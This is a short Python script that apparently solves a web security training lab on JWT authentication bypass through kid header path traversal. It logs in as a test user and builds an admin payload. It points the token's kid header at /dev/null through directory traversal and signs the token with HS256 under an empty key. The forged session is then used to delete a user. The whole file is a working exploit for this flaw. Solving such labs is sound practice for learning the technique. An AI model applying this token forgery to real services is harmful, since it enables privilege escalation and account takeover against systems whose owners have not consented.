import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common import become_admin_payload, delete_carlos, get_session_token, lab_session, set_session, sign_hs256


lab = lab_session("JWT authentication bypass via kid header path traversal")
lab.login("wiener", "peter")

header, payload = become_admin_payload(get_session_token(lab))
header["alg"] = "HS256"
header["kid"] = "../../../../../../../../dev/null"
forged = sign_hs256(header, payload, b"")

set_session(lab, forged)
delete_carlos(lab)

